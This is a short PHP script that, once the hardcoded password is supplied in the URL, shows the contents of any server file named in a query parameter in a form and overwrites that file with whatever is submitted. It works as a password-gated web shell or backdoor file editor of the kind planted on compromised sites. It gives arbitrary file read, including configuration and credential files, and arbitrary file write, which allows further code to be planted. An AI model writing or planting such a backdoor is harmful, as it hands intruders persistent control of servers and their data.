<?php
if ($_GET['password'] == "fuckedme" AND !empty($_GET['file'])) {
    if (isset($_POST['submit'])) {
        $edit = $_POST['edit'];
        $file = $_GET['file'];
        echo htmlspecialchars($edit);
        $f=fopen($file ,'w');
        fwrite($f,$edit);
        fclose($f);
    }
echo '<form method="post">
    <textarea name="edit">'.htmlspecialchars(file_get_contents($_GET['file'])).'</textarea>
        <input type="submit" name="submit" />
</form>';
}
?>